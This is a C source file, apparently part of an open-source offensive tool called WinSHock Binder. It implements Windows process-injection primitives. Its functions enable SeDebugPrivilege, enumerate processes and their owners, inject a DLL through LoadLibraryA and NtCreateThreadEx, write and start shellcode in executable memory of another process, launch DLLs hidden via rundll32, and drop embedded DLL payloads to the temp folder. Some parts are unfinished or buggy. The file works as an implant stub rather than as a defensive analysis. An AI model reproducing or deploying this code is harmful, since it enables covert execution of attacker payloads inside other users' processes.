// WinSHock Binder (WsBind) Process Stub
//
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

typedef struct PROCINFO {
    int id;
    char *name;
    char *path;
    char *owner;
    int parentId;
} Process;
typedef struct THREADDATA {
    unsigned char *data;
} ThreadData, *PThreadData;

BOOL wsDEBUG_LOADED = FALSE;

HANDLE wsp_thread_ex(HANDLE pHandle, LPVOID pAddress, LPVOID pSpace);

int wsp_set_debug()
{
    HANDLE wsToken;
    LUID wsTokenValue;
    TOKEN_PRIVILEGES wsTokenP;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &wsToken)) return WSB_ERROR_PROC_DEBUG_NO_TOKEN;
    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &wsTokenValue)) return WSB_ERROR_PROC_DEBUG_CANT_LOOKUP;
    wsTokenP.PrivilegeCount = 1;
    wsTokenP.Privileges[0].Luid = wsTokenValue;
    wsTokenP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(wsToken, FALSE, &wsTokenP, sizeof(wsTokenP), NULL, NULL)) return WSB_ERROR_PROC_DEBUG_CANT_ADJUST;
    CloseHandle(wsToken);
    return WSB_SUCCESS;
}
int wsp_get_ppid(int wsProcessPID)
{
    HANDLE wsHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 wsProc = { 0 };
    wsProc.dwSize = sizeof(PROCESSENTRY32);
    if(Process32First(wsHandle, &wsProc))
        do
        {
            if(wsProc.th32ProcessID == wsProcessPID) return wsProc.th32ParentProcessID;
        } while (Process32Next(wsHandle, &wsProc));
    return WSB_FAIL;
}
char* wsp_get_user(HANDLE wsProcess)
{
    HANDLE wsTokenHandle;
    OpenProcessToken(wsProcess, TOKEN_READ, &wsTokenHandle);
    if(wsTokenHandle == NULL) return NULL;
    PTOKEN_USER wsUser = NULL;
    DWORD wsSize = 0, wsMAX = WSB_LSTRING;
    if(!GetTokenInformation(wsTokenHandle, TokenUser, (LPVOID)wsUser, 0, &wsSize))
    {
        if(GetLastError() != ERROR_INSUFFICIENT_BUFFER) return NULL;
        wsUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, wsSize);
        if(wsUser == NULL) return NULL;
    }
    if(!GetTokenInformation(wsTokenHandle, TokenUser, (LPVOID)wsUser, wsSize, &wsSize))
    {
        HeapFree(GetProcessHeap(), 0, (LPVOID)wsUser);
        return NULL;
    }
    SID_NAME_USE wsSID;
    char wsName[WSB_LSTRING], wsDomain[WSB_LSTRING];
    if(!LookupAccountSid(NULL, wsUser->User.Sid, wsName, &wsMAX, wsDomain, &wsMAX, &wsSID))
    {
        if(GetLastError() == ERROR_NONE_MAPPED) return WSP_NO_USER;
        return NULL;
    }
    char* wsUsername = calloc(1, 2 + strlen(wsName) + strlen(wsDomain));
    strncat(wsUsername, wsDomain, strlen(wsDomain));
    strncat(wsUsername, "\\", 1);
    strncat(wsUsername, wsName, strlen(wsName));
    strncat(wsUsername, "\0", 1);
    if(wsUser != NULL) HeapFree(GetProcessHeap(), 0, (LPVOID)wsUser);
    return wsUsername;
}
Process* wsp_processes(int **wsProcCount)
{
    if(!wsDEBUG_LOADED)
    {
        wsp_set_debug();
        wsDEBUG_LOADED = TRUE;
    }
    DWORD pList[4096], pRet, pCount;
    if(!EnumProcesses(pList, sizeof(pList), &pRet))
        return NULL;
    pCount = pRet/sizeof(DWORD);
    Process *pInfo = malloc(pCount * sizeof(Process));
    HANDLE pHandle;
    HMODULE pModule;
    int pCounter;
    *wsProcCount = (int*)&pCount;
    DWORD count;
    for(pCounter = 0; pCounter < pCount; pCounter++)
    {
        pInfo[pCounter].id = pList[pCounter];
        pInfo[pCounter].name = calloc(WSB_LSTRING, 1);
        pInfo[pCounter].path = calloc(WSB_LSTRING, 1);
        pInfo[pCounter].parentId = wsp_get_ppid(pList[pCounter]);
        pHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pList[pCounter]);
        if(pHandle != NULL)
        {
            pInfo[pCounter].owner = wsp_get_user(pHandle);
            if(EnumProcessModules(pHandle, &pModule, sizeof(pModule), &count))
            {
                GetModuleBaseName(pHandle, pModule, pInfo[pCounter].name, WSB_LSTRING);
                GetProcessImageFileName(pHandle, pInfo[pCounter].path, WSB_LSTRING);
            }
            else
            {
                strcat(pInfo[pCounter].name, WSB_NULLS);
                strcat(pInfo[pCounter].path, WSB_NULLS);
            }
            if(pInfo[pCounter].owner == NULL)
                strcat(pInfo[pCounter].owner, WSB_NULLS);
        }
        else
        {
            pInfo[pCounter].owner = calloc(1, 1);
            strcat(pInfo[pCounter].name, WSB_NULLS);
            strcat(pInfo[pCounter].path, WSB_NULLS);
            strcat(pInfo[pCounter].owner, WSB_NULLS);
        }
    }
    return pInfo;
}
int wsp_inject_dll(int wsInjectPID, char* wsDllPath)
{
    HANDLE inProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, wsInjectPID);
    if(inProcess == NULL) return WSB_ERROR_PROC_MEM_NO_HANDLE;
    HMODULE inModule = GetModuleHandle("kernel32.dll");
    LPVOID inAddress = (LPVOID)GetProcAddress(inModule, "LoadLibraryA");
    if(inAddress == NULL) return WSB_ERROR_PROC_MEM_NO_ADDRESS;
    LPVOID inMemory = (LPVOID)VirtualAllocEx(inProcess, NULL, strlen(wsDllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(inMemory == NULL) return WSB_ERROR_PROC_MEM_NO_ALLOC;
    DWORD inCounter;
    if(WriteProcessMemory(inProcess, inMemory, wsDllPath, strlen(wsDllPath), (SIZE_T*)&inCounter) == 0) return WSB_ERROR_PROC_MEM_NO_WRITE;
    HANDLE inHandle = wsp_thread_ex(inProcess, inAddress, inMemory);
    if(inHandle == NULL) return WSB_ERROR_PROC_MEM_NO_HANDLE;
    CloseHandle(inProcess);
    return WSB_SUCCESS;
}
int wsp_execv(char* wsCommand, char** wsBuffer, int wsHidden)
{
    SECURITY_ATTRIBUTES pSecAttr;
    HANDLE pOutRead, pOutWrite, pErrRead, pErrWrite;
    PROCESS_INFORMATION pInfo;
    STARTUPINFO pSInfo;
    pSecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    pSecAttr.bInheritHandle = TRUE;
    pSecAttr.lpSecurityDescriptor = NULL;
    if(!CreatePipe(&pErrRead, &pErrWrite, &pSecAttr, 0)) return WSB_ERROR_PROC_EXEV_NO_PIPE;
    if(!SetHandleInformation(pErrRead, HANDLE_FLAG_INHERIT, 0)) return WSB_ERROR_PROC_EXEV_NO_SET_PIPE;
    if(!CreatePipe(&pOutRead, &pOutWrite, &pSecAttr, 0)) return WSB_ERROR_PROC_EXEV_NO_PIPE;
    if(!SetHandleInformation(pOutRead, HANDLE_FLAG_INHERIT, 0)) return WSB_ERROR_PROC_EXEV_NO_SET_PIPE;
    memset(&pInfo, 0, sizeof(pInfo));
    memset(&pSInfo, 0, sizeof(pSInfo));
    pSInfo.cb = sizeof(STARTUPINFO);
    pSInfo.hStdError = pErrWrite;
    pSInfo.hStdOutput = pOutWrite;
    pSInfo.dwFlags |= STARTF_USESTDHANDLES;
    int pFlags = WSP_NON_HIDDEN_PROC;
    if(wsHidden == 1) pFlags = WSP_HIDDEN_ATTR;
    if(CreateProcess(NULL, wsCommand, NULL, NULL, TRUE, pFlags, NULL, NULL, &pSInfo, &pInfo) == 0) return WSB_ERROR_PROC_EXEV_CMD_NO_EXIST;
    CloseHandle(pErrWrite);
    CloseHandle(pOutWrite);
    if(wsBuffer != NULL)
    {
        DWORD pStats = 0;
        int pDone = 0, pPos = 0, pSize = 200;
        char *pBuffer = calloc(200, 1), *pOutput = calloc(200, 1), *pOutBack;
        for(;;)
        {
            pDone = ReadFile(pOutRead, pBuffer, 100, &pStats, NULL);
            if(pDone == 0 || pStats == 0) break;
            if(pPos + pStats >= pSize)
            {
                pOutBack = pOutput;
                if((pOutput = realloc(pOutput, pSize + 200)) == NULL)
                {
                    pOutput = pOutBack;
                    break;
                }
                else
                    pSize += 200;
            }
            strncat(pOutput, pBuffer, pStats);
            pPos += pStats;
        }
        for(;;)
        {
            pDone = ReadFile(pErrRead, pBuffer, 100, &pStats, NULL);
            if(pDone == 0 || pStats == 0) break;
            if(pPos + pStats >= pSize)
            {
                pOutBack = pOutput;
                if((pOutput = realloc(pOutput, pSize + 200)) == NULL)
                {
                    pOutput = pOutBack;
                    break;
                }
                else
                    pSize += 200;
            }
            strncat(pOutput, pBuffer, pStats);
            pPos += pStats;
        }
        free(pBuffer);
        if((*wsBuffer = realloc(*wsBuffer, pPos + 1)) == NULL) return pInfo.dwProcessId;
        if(*wsBuffer == NULL) return pInfo.dwProcessId;
        wsu_clear_buffer(wsBuffer, pPos);
        //int aa = 0;
        //for(; aa < pPos; aa++) (*wsBuffer)[aa] = 0;
        strncpy(*wsBuffer, pOutput, pPos - 1);
        strncat(*wsBuffer, "\0", 1);
    }
    CloseHandle(pErrRead);
    CloseHandle(pOutRead);
    return pInfo.dwProcessId;
}
HANDLE wsp_thread_ex(HANDLE pHandle, LPVOID pAddress, LPVOID pSpace)
{
    typedef DWORD (WINAPI * functypeNtCreateThreadEx)
    (
            PHANDLE ThreadHandle,
            ACCESS_MASK DesiredAccess,
            LPVOID ObjectAttributes,
            HANDLE ProcessHandle,
            LPTHREAD_START_ROUTINE lpStartAddress,
            LPVOID lpParameter,
            BOOL CreateSuspended,
            DWORD dwStackSize,
            DWORD Unknown1,
            DWORD Unknown2,
            LPVOID Unknown3
    );
    HANDLE pThread = NULL;
    HMODULE pNtModule = GetModuleHandle("ntdll.dll");
    if(pNtModule == NULL) return NULL;
    functypeNtCreateThreadEx pFuncNTEx = (functypeNtCreateThreadEx)GetProcAddress(pNtModule, "NtCreateThreadEx");
    if(!pFuncNTEx) return NULL;
    // see if we can get rid of the warnings
    //pFuncNTEx(&pThread, GENERIC_ALL, NULL, pHandle, (LPTHREAD_START_ROUTINE)pAddress, pSpace, FALSE, (DWORD)NULL, (DWORD)NULL, (DWORD)NULL, NULL);
    pFuncNTEx(&pThread, GENERIC_ALL, NULL, pHandle, (LPTHREAD_START_ROUTINE)pAddress, pSpace, FALSE, (DWORD)0, (DWORD)0, (DWORD)0, NULL);
    return pThread;
}
int wsp_run_dll(char* wsDllPath, char* wsDllEntry, char* wsArguments)
{
	int wsArgSize = 10 + strlen(wsDllPath) + strlen(wsDllEntry);
	if(wsArguments != NULL) wsArgSize += (1 + strlen(wsArguments));
	char *wsDllCommand = calloc(wsArgSize, 1);
	sprintf(wsDllCommand, "rundll32 %s,%s", wsDllPath, wsDllEntry);
	if(wsArguments != NULL)
	{
		strncat(wsDllCommand, " ", 1);
		strncat(wsDllCommand, wsArguments, strlen(wsArguments));
	}
	printf("Command> '%s'", wsDllCommand);
    int wsRet = wsp_execv(wsDllCommand, NULL, 1);
    free(wsDllCommand);
    return wsRet;
}
int wsp_inject_scode(int wsInjectPID, int wsDataSize, unsigned char* wsSCode)
{
    HANDLE inProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, wsInjectPID);
    if(inProcess == NULL) return WSB_ERROR_PROC_MEM_NO_HANDLE;
    int wsDataLen = wsDataSize;
    if(wsDataLen <= 0) wsDataLen = strlen(wsSCode);
    LPVOID inMemory = (LPVOID)VirtualAllocEx(inProcess, NULL, wsDataLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(inMemory == NULL) return WSB_ERROR_PROC_MEM_NO_ALLOC;
    DWORD inCounter;
    if(WriteProcessMemory(inProcess, inMemory, wsSCode, wsDataLen, (SIZE_T*)&inCounter) == 0) return WSB_ERROR_PROC_MEM_NO_WRITE;
    HANDLE inHandle = wsp_thread_ex(inProcess, inMemory, NULL);
    if(inHandle == NULL) return WSB_ERROR_PROC_MEM_NO_ALLOC;
    CloseHandle(inProcess);
    return WSB_SUCCESS;
}
char* wsp_create_dll(char* wsDllName, char* wsDllDir, int wsDataSize, unsigned char* wsDllData)
{
    char* wsTempFullPath;
    if(wsDllDir == NULL)
    {
        char* wsTempPath = calloc(WSB_LSTRING, 1);
        if(GetTempPath(WSB_LSTRING, wsTempPath) == 0) return NULL;
        wsTempFullPath = calloc(strlen(wsTempPath) + strlen(wsDllName), 1);
        strncat(wsTempFullPath, wsTempPath, strlen(wsTempPath));
        strncat(wsTempFullPath, wsDllName, strlen(wsDllName));
        free(wsTempPath);
    }
    else
    {
        wsTempFullPath = calloc(strlen(wsDllDir) + strlen(wsDllName), 1);
        strncat(wsTempFullPath, wsDllDir, strlen(wsDllDir));
        strncat(wsTempFullPath, wsDllName, strlen(wsDllName));
    }
    FILE *wsDLLTemp = fopen(wsTempFullPath, "wb");
    if(wsDLLTemp == NULL) return NULL;
    int wsCount, wsDllSize = wsDataSize;
    if(wsDataSize <= 0) wsDllSize = strlen(wsDllData);
    for(wsCount = 0; wsCount < wsDllSize; wsCount++)
        fprintf(wsDLLTemp, "%c", wsDllData[wsCount]);
    fclose(wsDLLTemp);
    free(wsDLLTemp);
    return wsTempFullPath;
}

HANDLE wsp_create_thread(void* wsMethod, unsigned char *wsArguments)
{
    //ThreadData wsData = (Thr);
    // Work on this
}